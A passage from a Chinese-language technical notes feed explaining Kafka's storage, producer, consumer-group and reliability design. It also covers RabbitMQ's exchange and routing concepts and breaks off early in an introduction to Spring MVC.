<p><strong>首先应该知道 Kafka 的消息是存在于文件系统之上的</strong>。Kafka 高度依赖文件系统来存储和缓存消息，一般的人认为 “磁盘是缓慢的”，所以对这样的设计持有怀疑态度。实际上，磁盘比人们预想的快很多也慢很多，这取决于它们如何被使用；一个好的磁盘结构设计可以使之跟网络速度一样快。</p>
<p>现代的操作系统针对磁盘的读写已经做了一些优化方案来加快磁盘的访问速度。比如，<strong>预读</strong>会提前将一个比较大的磁盘快读入内存。<strong>后写</strong>会将很多小的逻辑写操作合并起来组合成一个大的物理写操作。并且，操作系统还会将主内存剩余的所有空闲内存空间都用作<strong>磁盘缓存</strong>，所有的磁盘读写操作都会经过统一的磁盘缓存（除了直接 I/O 会绕过磁盘缓存）。综合这几点优化特点，<strong>如果是针对磁盘的顺序访问，某些情况下它可能比随机的内存访问都要快，甚至可以和网络的速度相差无几。</strong></p>
<p><strong>上述的 Topic 其实是逻辑上的概念，面相消费者和生产者，物理上存储的其实是 Partition</strong>，每一个 Partition 最终对应一个目录，里面存储所有的消息和索引文件。默认情况下，每一个 Topic 在创建时如果不指定 Partition 数量时只会创建 1 个 Partition。比如，我创建了一个 Topic 名字为 test ，没有指定 Partition 的数量，那么会默认创建一个 test-0 的文件夹，这里的命名规则是：<code>&lt;topic_name&gt;-&lt;partition_id&gt;</code>。</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-文件系统存储.png" alt="" loading="lazy"></p>
<p>任何发布到 Partition 的消息都会被追加到 Partition 数据文件的尾部，这样的顺序写磁盘操作让 Kafka 的效率非常高（经验证，顺序写磁盘效率比随机写内存还要高，这是 Kafka 高吞吐率的一个很重要的保证）。</p>
<p>每一条消息被发送到 Broker 中，会根据 Partition 规则选择被存储到哪一个 Partition。如果 Partition 规则设置的合理，所有消息可以均匀分布到不同的 Partition中。</p>
<h3 id="底层存储设计" tabindex="-1"> 底层存储设计</h3>
<p>假设现在 Kafka 集群只有一个 Broker，我们创建 2 个 Topic 名称分别为：「topic1」和「topic2」，Partition 数量分别为 1、2，那么根目录下就会创建如下三个文件夹：</p>
<div><pre><code>    <span>|</span> --topic1-0
    <span>|</span> --topic2-0
    <span>|</span> --topic2-1
</code></pre></div><p>在 Kafka 的文件存储中，同一个 Topic 下有多个不同的 Partition，每个 Partition 都为一个目录，而每一个目录又被平均分配成多个大小相等的 <strong>Segment File</strong> 中，Segment File 又由 index file 和 data file 组成，他们总是成对出现，后缀 “.index” 和 “.log” 分表表示 Segment 索引文件和数据文件。</p>
<p>现在假设设置每个 Segment 大小为 500 MB，并启动生产者向 topic1 中写入大量数据，topic1-0 文件夹中就会产生类似如下的一些文件：</p>
<div><pre><code>   <span>|</span> --topic1-0 
       <span>|</span> --00000000000000000000.index 
       <span>|</span> --00000000000000000000.log 
       <span>|</span> --00000000000000368769.index 
       <span>|</span> --00000000000000368769.log 
       <span>|</span> --00000000000000737337.index 
       <span>|</span> --00000000000000737337.log 
       <span>|</span> --00000000000001105814.index <span>|</span> --00000000000001105814.log 
   <span>|</span> --topic2-0 
   <span>|</span> --topic2-1

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><p>**Segment 是 Kafka 文件存储的最小单位。**Segment 文件命名规则：Partition 全局的第一个 Segment 从 0 开始，后续每个 Segment 文件名为上一个 Segment 文件最后一条消息的 offset 值。数值最大为 64 位 long 大小，19 位数字字符长度，没有数字用0填充。如 00000000000000368769.index 和 00000000000000368769.log。</p>
<p>以上面的一对 Segment File 为例，说明一下索引文件和数据文件对应关系：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-segment存储单位.png" alt="索引文件和数据文件" loading="lazy"></p>
<p>其中以索引文件中元数据 <code>&lt;3, 497&gt;</code> 为例，依次在数据文件中表示第 3 个 message（在全局 Partition 表示第 368769 + 3 = 368772 个 message）以及该消息的物理偏移地址为 497。</p>
<p>注意该 index 文件并不是从0开始，也不是每次递增1的，这是因为 Kafka 采取稀疏索引存储的方式，每隔一定字节的数据建立一条索引，它减少了索引文件大小，使得能够把 index 映射到内存，降低了查询时的磁盘 IO 开销，同时也并没有给查询带来太多的时间消耗。</p>
<p>因为其文件名为上一个 Segment 最后一条消息的 offset ，所以当需要查找一个指定 offset 的 message 时，通过在所有 segment 的文件名中进行二分查找就能找到它归属的 segment ，再在其 index 文件中找到其对应到文件上的物理位置，就能拿出该 message 。</p>
<p>由于消息在 Partition 的 Segment 数据文件中是顺序读写的，且消息消费后不会删除（删除策略是针对过期的 Segment 文件），这种顺序磁盘 IO 存储设计师 Kafka 高性能很重要的原因。</p>
<blockquote>
<p>Kafka 是如何准确的知道 message 的偏移的呢？这是因为在 Kafka 定义了标准的数据存储结构，在 Partition 中的每一条 message 都包含了以下三个属性：</p>
<ul>
<li>offset：表示 message 在当前 Partition 中的偏移量，是一个逻辑上的值，唯一确定了 Partition 中的一条 message，可以简单的认为是一个 id；</li>
<li>MessageSize：表示 message 内容 data 的大小；</li>
<li>data：message 的具体内容</li>
</ul>
</blockquote>
<h2 id="生产者设计" tabindex="-1"> 生产者设计</h2>
<p>当发送消息之前，先问几个问题：每条消息都是很关键且不能容忍丢失么？偶尔重复消息可以么？关注的是消息延迟还是写入消息的吞吐量？</p>
<p>举个例子，有一个信用卡交易处理系统，当交易发生时会发送一条消息到 Kafka，另一个服务来读取消息并根据规则引擎来检查交易是否通过，将结果通过 Kafka 返回。对于这样的业务，消息既不能丢失也不能重复，由于交易量大因此吞吐量需要尽可能大，延迟可以稍微高一点。</p>
<p>再举个例子，假如我们需要收集用户在网页上的点击数据，对于这样的场景，少量消息丢失或者重复是可以容忍的，延迟多大都不重要只要不影响用户体验，吞吐则根据实时用户数来决定。</p>
<p>不同的业务需要使用不同的写入方式和配置。具体的方式在这里不做讨论，现在先看下生产者写消息的基本流程：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-生产者设计.png" alt="生产者设计" loading="lazy"></p>
<p>流程如下：</p>
<ol>
<li>首先，我们需要创建一个ProducerRecord，这个对象需要包含消息的主题（topic）和值（value），可以选择性指定一个键值（key）或者分区（partition）。</li>
<li>发送消息时，生产者会对键值和值序列化成字节数组，然后发送到分配器（partitioner）。</li>
<li>如果我们指定了分区，那么分配器返回该分区即可；否则，分配器将会基于键值来选择一个分区并返回。</li>
<li>选择完分区后，生产者知道了消息所属的主题和分区，它将这条记录添加到相同主题和分区的批量消息中，另一个线程负责发送这些批量消息到对应的Kafka broker。</li>
<li>当broker接收到消息后，如果成功写入则返回一个包含消息的主题、分区及位移的RecordMetadata对象，否则返回异常。</li>
<li>生产者接收到结果后，对于异常可能会进行重试。</li>
</ol>
<h2 id="消费者设计" tabindex="-1"> 消费者设计</h2>
<h3 id="消费者和消费者组" tabindex="-1"> 消费者和消费者组</h3>
<p>假设场景：从Kafka中读取消息，并且进行检查，最后产生结果数据。可以创建一个消费者实例去做这件事情，但如果生产者写入消息的速度比消费者读取的速度快怎么办呢？这样随着时间增长，消息堆积越来越严重。对于这种场景，需要增加多个消费者来进行水平扩展。</p>
<p>Kafka消费者是<strong>消费组</strong>的一部分，当多个消费者形成一个消费组来消费主题时，每个消费者会收到不同分区的消息。假设有一个T1主题，该主题有4个分区；同时我们有一个消费组G1，这个消费组只有一个消费者C1。那么消费者C1将会收到这4个分区的消息，如下所示：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-消费者设计-1.png" alt="" loading="lazy"></p>
<p>如果我们增加新的消费者C2到消费组G1，那么每个消费者将会分别收到两个分区的消息，如下所示：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-消费者设计-2.png" alt="" loading="lazy"></p>
<p>如果增加到4个消费者，那么每个消费者将会分别收到一个分区的消息，如下所示：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-消费者设计-3.png" alt="" loading="lazy"></p>
<p>但如果我们继续增加消费者到这个消费组，剩余的消费者将会空闲，不会收到任何消息：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-消费者设计-4.png" alt="" loading="lazy"></p>
<p>总而言之，我们可以通过增加消费组的消费者来进行水平扩展提升消费能力。这也是为什么建议创建主题时使用比较多的分区数，这样可以在消费负载高的情况下增加消费者来提升性能。另外，消费者的数量不应该比分区数多，因为多出来的消费者是空闲的，没有任何帮助。</p>
<p>**Kafka一个很重要的特性就是，只需写入一次消息，可以支持任意多的应用读取这个消息。**换句话说，每个应用都可以读到全量的消息。为了使得每个应用都能读到全量消息，应用需要有不同的消费组。对于上面的例子，假如我们新增了一个新的消费组G2，而这个消费组有两个消费者，那么会是这样的：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-消费者设计-5.png" alt="" loading="lazy"></p>
<p>在这个场景中，消费组G1和消费组G2都能收到T1主题的全量消息，在逻辑意义上来说它们属于不同的应用。</p>
<p>最后，总结起来就是：如果应用需要读取全量消息，那么请为该应用设置一个消费组；如果该应用消费能力不足，那么可以考虑在这个消费组里增加消费者。</p>
<h3 id="消费者组与分区重平衡" tabindex="-1"> 消费者组与分区重平衡</h3>
<p>当一些原因导致consumer对partition消费不再均匀时，kafka会自动执行reblance，使得consumer对partition的消费再次平衡。
什么时候发生rebalance？：</p>
<ul>
<li>组订阅topic数变更</li>
<li>topic partition数变更</li>
<li>consumer成员变更</li>
<li>consumer 加入群组或者离开群组的时候</li>
<li>consumer被检测为崩溃的时候</li>
</ul>
<p>可以看到，当新的消费者加入消费组，它会消费一个或多个分区，而这些分区之前是由其他消费者负责的；另外，当消费者离开消费组（比如重启、宕机等）时，它所消费的分区会分配给其他分区。这种现象称为<strong>重平衡（rebalance）</strong>。重平衡是 Kafka 一个很重要的性质，这个性质保证了高可用和水平扩展。**不过也需要注意到，在重平衡期间，所有消费者都不能消费消息，因此会造成整个消费组短暂的不可用。**而且，将分区进行重平衡也会导致原来的消费者状态过期，从而导致消费者需要重新更新状态，这段期间也会降低消费性能。后面我们会讨论如何安全的进行重平衡以及如何尽可能避免。</p>
<p>消费者通过定期发送心跳（hearbeat）到一个作为组协调者（group coordinator）的 broker 来保持在消费组内存活。这个 broker 不是固定的，每个消费组都可能不同。当消费者拉取消息或者提交时，便会发送心跳。</p>
<p>如果消费者超过一定时间没有发送心跳，那么它的会话（session）就会过期，组协调者会认为该消费者已经宕机，然后触发重平衡。可以看到，从消费者宕机到会话过期是有一定时间的，这段时间内该消费者的分区都不能进行消息消费；通常情况下，我们可以进行优雅关闭，这样消费者会发送离开的消息到组协调者，这样组协调者可以立即进行重平衡而不需要等待会话过期。</p>
<p>在 0.10.1 版本，Kafka 对心跳机制进行了修改，将发送心跳与拉取消息进行分离，这样使得发送心跳的频率不受拉取的频率影响。另外更高版本的 Kafka 支持配置一个消费者多长时间不拉取消息但仍然保持存活，这个配置可以避免活锁（livelock）。活锁，是指应用没有故障但是由于某些原因不能进一步消费。</p>
<h3 id="partition-与消费模型" tabindex="-1"> Partition 与消费模型</h3>
<p>上面提到，Kafka 中一个 topic 中的消息是被打散分配在多个 Partition(分区) 中存储的， Consumer Group 在消费时需要从不同的 Partition 获取消息，那最终如何重建出 Topic 中消息的顺序呢？</p>
<p>答案是：没有办法。Kafka 只会保证在 Partition 内消息是有序的，而不管全局的情况。</p>
<p>下一个问题是：Partition 中的消息可以被（不同的 Consumer Group）多次消费，那 Partition中被消费的消息是何时删除的？ Partition 又是如何知道一个 Consumer Group 当前消费的位置呢？</p>
<p>无论消息是否被消费，除非消息到期 Partition 从不删除消息。例如设置保留时间为 2 天，则消息发布 2 天内任何 Group 都可以消费，2 天后，消息自动被删除。
Partition 会为每个 Consumer Group 保存一个偏移量，记录 Group 消费到的位置。 如下图：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-Partition与消费模型.png" alt="" loading="lazy"></p>
<h3 id="消费者的-pull-模型" tabindex="-1"> 消费者的 pull 模型</h3>
<p>消费者应该向 Broker 要数据（pull）还是 Broker 向消费者推送数据（push）？作为一个消息系统，Kafka 遵循了传统的方式，选择由 Producer 向 broker push 消息并由 Consumer 从 broker pull 消息。一些 logging-centric system，比如 Facebook 的<a href="https://github.com/facebookarchive/scribe" target="_blank" rel="noopener noreferrer">Scribe</a>和 Cloudera 的<a href="https://flume.apache.org/" target="_blank" rel="noopener noreferrer">Flume</a>，采用 push 模式。事实上，push 模式和 pull 模式各有优劣。</p>
<p><strong>push 模式很难适应消费速率不同的消费者，因为消息发送速率是由 broker 决定的</strong>。push 模式的目标是尽可能以最快速度传递消息，但是这样很容易造成 Consumer 来不及处理消息，典型的表现就是拒绝服务以及网络拥塞。<strong>而 pull 模式则可以根据 Consumer 的消费能力以适当的速率消费消息。</strong></p>
<p><strong>对于 Kafka 而言，pull 模式更合适</strong>，pull 模式可简化 broker 的设计，Consumer 可自主控制消费消息的速率，同时 Consumer 可以自己控制消费方式——即可批量消费也可逐条消费，同时还能选择不同的提交方式从而实现不同的传输语义。</p>
<h2 id="kafka-可靠性" tabindex="-1"> Kafka 可靠性</h2>
<p>Kafka 中的可靠性保证有如下四点：</p>
<ul>
<li>对于一个分区来说，它的消息是有序的。如果一个生产者向一个分区先写入消息A，然后写入消息B，那么消费者会先读取消息A再读取消息B。</li>
<li>当消息写入所有in-sync状态的副本后，消息才会认为<strong>已提交（committed）</strong>。这里的写入有可能只是写入到文件系统的缓存，不一定刷新到磁盘。生产者可以等待不同时机的确认，比如等待分区主副本写入即返回，后者等待所有in-sync状态副本写入才返回。</li>
<li>一旦消息已提交，那么只要有一个副本存活，数据不会丢失。</li>
<li>消费者只能读取到已提交的消息。</li>
</ul>
<p>使用这些基础保证，我们构建一个可靠的系统，这时候需要考虑一个问题：究竟我们的应用需要多大程度的可靠性？可靠性不是无偿的，它与系统可用性、吞吐量、延迟和硬件价格息息相关，得此失彼。因此，我们往往需要做权衡，一味的追求可靠性并不实际。</p>
<h1 id="对比rocketmq" tabindex="-1"> 对比RocketMQ</h1>
<h2 id="消息消费" tabindex="-1"> 消息消费</h2>
<h3 id="消息投递实时性" tabindex="-1"> 消息投递实时性</h3>
<ul>
<li>Kafka使用短轮询方式，实时性取决于轮询间隔时间</li>
<li>RocketMQ使用长轮询，同Push方式实时性一致，消息的投递延时通常在几个毫秒。</li>
</ul>
<h3 id="消费失败重试" tabindex="-1"> 消费失败重试</h3>
<ul>
<li>Kafka消费失败不支持重试</li>
<li>RocketMQ消费失败支持定时重试，每次重试间隔时间顺延</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">框架</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">RabbitMQ 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/RabbitMQ.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/RabbitMQ.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="rabbitmq-介绍" tabindex="-1"> RabbitMQ 介绍</h1>
<h2 id="简介" tabindex="-1"> 简介</h2>
<p>RabbitMQ 是采用 Erlang 语言实现 AMQP(Advanced Message Queuing Protocol，高级消息队列协议）的消息中间件，它最初起源于金融系统，用于在分布式系统中存储转发消息。</p>
<p>RabbitMQ 发展到今天，被越来越多的人认可，这和它在易用性、扩展性、可靠性和高可用性等方面的卓著表现是分不开的。RabbitMQ 的具体特点可以概括为以下几点：</p>
<ul>
<li><strong>可靠性：</strong> RabbitMQ使用一些机制来保证消息的可靠性，如持久化、传输确认及发布确认等。</li>
<li><strong>灵活的路由：</strong> 在消息进入队列之前，通过交换器来路由消息。对于典型的路由功能，RabbitMQ 己经提供了一些内置的交换器来实现。针对更复杂的路由功能，可以将多个交换器绑定在一起，也可以通过插件机制来实现自己的交换器。这个后面会在我们将 RabbitMQ 核心概念的时候详细介绍到。</li>
<li><strong>扩展性：</strong> 多个RabbitMQ节点可以组成一个集群，也可以根据实际业务情况动态地扩展集群中节点。</li>
<li><strong>高可用性：</strong> 队列可以在集群中的机器上设置镜像，使得在部分节点出现问题的情况下队列仍然可用。</li>
<li><strong>支持多种协议：</strong> RabbitMQ 除了原生支持 AMQP 协议，还支持 STOMP、MQTT 等多种消息中间件协议。</li>
<li><strong>多语言客户端：</strong> RabbitMQ几乎支持所有常用语言，比如 Java、Python、Ruby、PHP、C#、JavaScript等。</li>
<li><strong>易用的管理界面：</strong> RabbitMQ提供了一个易用的用户界面，使得用户可以监控和管理消息、集群中的节点等。在安装 RabbitMQ 的时候会介绍到，安装好 RabbitMQ 就自带管理界面。</li>
<li><strong>插件机制：</strong> RabbitMQ 提供了许多插件，以实现从多方面进行扩展，当然也可以编写自己的插件。感觉这个有点类似 Dubbo 的 SPI机制。</li>
</ul>
<h2 id="核心概念" tabindex="-1"> 核心概念</h2>
<p>RabbitMQ 整体上是一个生产者与消费者模型，主要负责接收、存储和转发消息。可以把消息传递的过程想象成：当你将一个包裹送到邮局，邮局会暂存并最终将邮件通过邮递员送到收件人的手上，RabbitMQ就好比由邮局、邮箱和邮递员组成的一个系统。从计算机术语层面来说，RabbitMQ 模型更像是一种交换机模型。</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ架构.png" alt="RabbitMQ 的整体模型架构" loading="lazy"></p>
<h3 id="producer-生产者-和-consumer-消费者" tabindex="-1"> Producer(生产者) 和 Consumer(消费者)</h3>
<ul>
<li><strong>Producer(生产者)</strong> :生产消息的一方（邮件投递者）</li>
<li><strong>Consumer(消费者)</strong> :消费消息的一方（邮件收件人）</li>
</ul>
<p>消息一般由 2 部分组成：<strong>消息头</strong>（或者说是标签 Label）和 <strong>消息体</strong>。消息体也可以称为 payLoad ,消息体是不透明的，而消息头则由一系列的可选属性组成，这些属性包括 routing-key（路由键）、priority（相对于其他消息的优先权）、delivery-mode（指出该消息可能需要持久性存储）等。生产者把消息交由 RabbitMQ 后，RabbitMQ 会根据消息头把消息发送给感兴趣的 Consumer(消费者)。</p>
<h3 id="exchange-交换器" tabindex="-1"> Exchange(交换器)</h3>
<p>在 RabbitMQ 中，消息并不是直接被投递到 <strong>Queue(消息队列)</strong> 中的，中间还必须经过 <strong>Exchange(交换器)</strong> 这一层，<strong>Exchange(交换器)</strong> 会把我们的消息分配到对应的 <strong>Queue(消息队列)</strong> 中。</p>
<p><strong>Exchange(交换器)</strong> 用来接收生产者发送的消息并将这些消息路由给服务器中的队列中，如果路由不到，或许会返回给 <strong>Producer(生产者)</strong> ，或许会被直接丢弃掉 。这里可以将RabbitMQ中的交换器看作一个简单的实体。</p>
<p><strong>RabbitMQ 的 Exchange(交换器) 有4种类型，不同的类型对应着不同的路由策略</strong>：<strong>direct(默认)</strong>，<strong>fanout</strong>, <strong>topic</strong>, 和 <strong>headers</strong>，不同类型的Exchange转发消息的策略有所区别。这个会在介绍 <strong>Exchange Types(交换器类型)</strong> 的时候介绍到。</p>
<p>Exchange(交换器) 示意图如下：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-Exchange.png" alt="Exchange(交换器) 示意图" loading="lazy"></p>
<p>生产者将消息发给交换器的时候，一般会指定一个 <strong>RoutingKey(路由键)</strong>，用来指定这个消息的路由规则，而这个 <strong>RoutingKey 需要与交换器类型和绑定键(BindingKey)联合使用才能最终生效</strong>。</p>
<p>RabbitMQ 中通过 <strong>Binding(绑定)</strong> 将 <strong>Exchange(交换器)</strong> 与 <strong>Queue(消息队列)</strong> 关联起来，在绑定的时候一般会指定一个 <strong>BindingKey(绑定建)</strong> ,这样 RabbitMQ 就知道如何正确将消息路由到队列了,如下图所示。一个绑定就是基于路由键将交换器和消息队列连接起来的路由规则，所以可以将交换器理解成一个由绑定构成的路由表。Exchange 和 Queue 的绑定可以是多对多的关系。</p>
<p>Binding(绑定) 示意图：</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-Binding.png" alt="Binding(绑定) 示意图" loading="lazy"></p>
<p>生产者将消息发送给交换器时，需要一个RoutingKey,当 BindingKey 和 RoutingKey 相匹配时，消息会被路由到对应的队列中。在绑定多个队列到同一个交换器的时候，这些绑定允许使用相同的 BindingKey。BindingKey 并不是在所有的情况下都生效，它依赖于交换器类型，比如fanout类型的交换器就会无视，而是将消息路由到所有绑定到该交换器的队列中。</p>
<h3 id="queue-消息队列" tabindex="-1"> Queue(消息队列)</h3>
<p><strong>Queue(消息队列)</strong> 用来保存消息直到发送给消费者。它是消息的容器，也是消息的终点。一个消息可投入一个或多个队列。消息一直在队列里面，等待消费者连接到这个队列将其取走。</p>
<p><strong>RabbitMQ</strong> 中消息只能存储在 <strong>队列</strong> 中，这一点和 <strong>Kafka</strong> 这种消息中间件相反。Kafka 将消息存储在 <strong>topic（主题）</strong> 这个逻辑层面，而相对应的队列逻辑只是topic实际存储文件中的位移标识。 RabbitMQ 的生产者生产消息并最终投递到队列中，消费者可以从队列中获取消息并消费。</p>
<p><strong>多个消费者可以订阅同一个队列</strong>，这时队列中的消息会被平均分摊（Round-Robin，即轮询）给多个消费者进行处理，而不是每个消费者都收到所有的消息并处理，这样避免的消息被重复消费。</p>
<p><strong>RabbitMQ</strong> 不支持队列层面的广播消费,如果有广播消费的需求，需要在其上进行二次开发,这样会很麻烦，不建议这样做。</p>
<h3 id="broker-消息中间件的服务节点" tabindex="-1"> Broker（消息中间件的服务节点）</h3>
<p>对于 RabbitMQ 来说，一个 RabbitMQ Broker 可以简单地看作一个 RabbitMQ 服务节点，或者RabbitMQ服务实例。大多数情况下也可以将一个 RabbitMQ Broker 看作一台 RabbitMQ 服务器。</p>
<p>下图展示了生产者将消息存入 RabbitMQ Broker,以及消费者从Broker中消费数据的整个流程。</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-Broker.png" alt="消息队列的运转过程" loading="lazy"></p>
<p>这样图1中的一些关于 RabbitMQ 的基本概念我们就介绍完毕了，下面再来介绍一下 <strong>Exchange Types(交换器类型)</strong> 。</p>
<h3 id="exchange-types-交换器类型" tabindex="-1"> Exchange Types(交换器类型)</h3>
<p>RabbitMQ 常用的 Exchange Type 有 <strong>fanout</strong>、<strong>direct</strong>、<strong>topic</strong>、<strong>headers</strong> 这四种（AMQP规范里还提到两种 Exchange Type，分别为 system 与 自定义，这里不予以描述）。</p>
<h4 id="_1-fanout" tabindex="-1"> ① fanout</h4>
<p>fanout 类型的Exchange路由规则非常简单，它会把所有发送到该Exchange的消息路由到所有与它绑定的Queue中，不需要做任何判断操作，所以 fanout 类型是所有的交换机类型里面速度最快的。fanout 类型常用来广播消息。</p>
<h4 id="_2-direct" tabindex="-1"> ② direct</h4>
<p>direct 类型的Exchange路由规则也很简单，它会把消息路由到那些 Bindingkey 与 RoutingKey 完全匹配的 Queue 中。</p>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-direct.png" alt="direct 类型交换器" loading="lazy"></p>
<p>以上图为例，如果发送消息的时候设置路由键为“warning”,那么消息会路由到 Queue1 和 Queue2。如果在发送消息的时候设置路由键为&quot;Info”或者&quot;debug”，消息只会路由到Queue2。如果以其他的路由键发送消息，则消息不会路由到这两个队列中。</p>
<p>direct 类型常用在处理有优先级的任务，根据任务的优先级把消息发送到对应的队列，这样可以指派更多的资源去处理高优先级的队列。</p>
<h4 id="_3-topic" tabindex="-1"> ③ topic</h4>
<p>前面讲到direct类型的交换器路由规则是完全匹配 BindingKey 和 RoutingKey ，但是这种严格的匹配方式在很多情况下不能满足实际业务的需求。topic类型的交换器在匹配规则上进行了扩展，它与 direct 类型的交换器相似，也是将消息路由到 BindingKey 和 RoutingKey 相匹配的队列中，但这里的匹配规则有些不同，它约定：</p>
<ul>
<li>RoutingKey 为一个点号“．”分隔的字符串（被点号“．”分隔开的每一段独立的字符串称为一个单词），如 “com.rabbitmq.client”、“java.util.concurrent”、“com.hidden.client”;</li>
<li>BindingKey 和 RoutingKey 一样也是点号“．”分隔的字符串；</li>
<li>BindingKey 中可以存在两种特殊字符串“<em>”和“#”，用于做模糊匹配，其中“</em>”用于匹配一个单词，“#”用于匹配多个单词(可以是零个)。</li>
</ul>
<p><img src="@source/assets/cs-note/framework/message-queue/RabbitMQ-topic.png" alt="topic 类型交换器" loading="lazy"></p>
<p>以上图为例：</p>
<ul>
<li>路由键为 “com.rabbitmq.client” 的消息会同时路由到 Queuel 和 Queue2;</li>
<li>路由键为 “com.hidden.client” 的消息只会路由到 Queue2 中；</li>
<li>路由键为 “com.hidden.demo” 的消息只会路由到 Queue2 中；</li>
<li>路由键为 “java.rabbitmq.demo” 的消息只会路由到Queuel中；</li>
<li>路由键为 “java.util.concurrent” 的消息将会被丢弃或者返回给生产者（需要设置 mandatory 参数），因为它没有匹配任何路由键。</li>
</ul>
<h4 id="_4-headers-不推荐" tabindex="-1"> ④ headers(不推荐)</h4>
<p>headers 类型的交换器不依赖于路由键的匹配规则来路由消息，而是根据发送的消息内容中的 headers 属性进行匹配。在绑定队列和交换器时制定一组键值对，当发送消息到交换器时，RabbitMQ会获取到该消息的 headers（也是一个键值对的形式)'对比其中的键值对是否完全匹配队列和交换器绑定时指定的键值对，如果完全匹配则消息会路由到该队列，否则不会路由到该队列。headers 类型的交换器性能会很差，而且也不实用，基本上不会看到它的存在。</p>
<h1 id="rabbitmq-使用" tabindex="-1"> RabbitMQ 使用</h1>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Spring MVC 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring-MVC.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring-MVC.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[ 
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>
 
<h1 id="spring-mvc-介绍" tabindex="-1"> Spring MVC 介绍</h1>
<p>Spring Web MVC是一种基于Java的实现了Web MVC设计模式的请求驱动类型的轻量级Web框架，即使用了MVC架构模式的思想，将web层进行职责解耦，基于请求驱动指的就是使用请求-响应模型。</p>
<h2 id="mvc模式" tabindex="-1"> MVC模式</h2>
<p><strong>MVC</strong>(Model View Controller)是一种软件设计的框架模式，它采用模型(<strong>Model</strong>)-视图(<strong>View</strong>)-控制器(<strong>Controller</strong>)的方法把业务逻辑、数据与界面显示分离。MVC的理念就是把数据处理、数据展示(界面)和程序/用户的交互三者分离开的一种编程模式。</p>
<p>MVC框架模式是一种复合模式，MVC的三个核心部件分别是</p>
<ul>
<li>Model(模型)：所有的用户数据、状态以及程序逻辑，独立于视图和控制器</li>
<li>View(视图)：呈现模型，类似于Web程序中的界面，视图会从模型中拿到需要展现的状态以及数据，对于相同的数据可以有多种不同的显示形式(视图)</li>
<li>Controller(控制器)：负责获取用户的输入信息，进行解析并反馈给模型，通常情况下一个视图具有一个控制器</li>
</ul>
<h3 id="mvc的好处" tabindex="-1"> MVC的好处</h3>
<p>程序通过将M(Model)和V(View)的代码分离，实现了前后端代码的分离</p>
<ul>
<li>可以使同一个程序使用不同的表现形式，如果控制器反馈给模型的数据发生了变化，那么模型将及时通知有关的视图，视图会对应的刷新自己所展现的内容</li>
<li>模型是独立于视图的，所以模型可复用，模型可以独立的移植到别的地方继续使用</li>
<li>前后端的代码分离，使项目开发的分工更加明确，程序的测试更加简便，提高开发效率</li>
</ul>
<h3 id="mvc模式在web中应用" tabindex="-1"> MVC模式在Web中应用</h3>
<p><strong>MVC框架模式在B/S下的应用</strong></p>
<ul>
<li>V：View视图，Web程序中指用户可以看到的并可以与之进行数据交互的界面，比如一个html网页界面，MVC可以为程序处理很多不同的视图，用户在视图中进行输出数据以及一系列操作，注意：视图中不会发生数据的处理操作</li>
<li>M：Model模型：进行所有数据的处理工作，模型返回的数据是中立的，和数据格式无关，一个模型可以为多个视图来提供数据，所以模型的代码重复性比较低</li>
<li>C：Controller控制器：负责接受用户的输入，并且调用模型和视图去完成用户的需求，控制器不会输出也不会做出任何处理，只会接受请求并调用模型构件去处理用户的请求，然后在确定用哪个视图去显示返回的数据</li>
</ul>
<div align="center">
<p><img src="@source/assets/cs-note/framework/spring/springmvc-mvc.gif" alt="" title=":size=600" loading="lazy"></p>
</div>
<ol>
<li>浏览器发送请求到控制器;</li>
<li>控制器不能处理请求必须给模型层来处理接着去访问数据库</li>
<li>模型层将处理好的结果返回给控制层</li>
<li>控制层将逻辑视图响应给浏览器.</li>
</ol>
<p>MVC的本质 : MVC的核心思想是业务数据抽取,同物业数据呈现分离;有利于程序简化,方便编程</p>
<p><strong>MVC在Web中的优点</strong></p>
<ul>
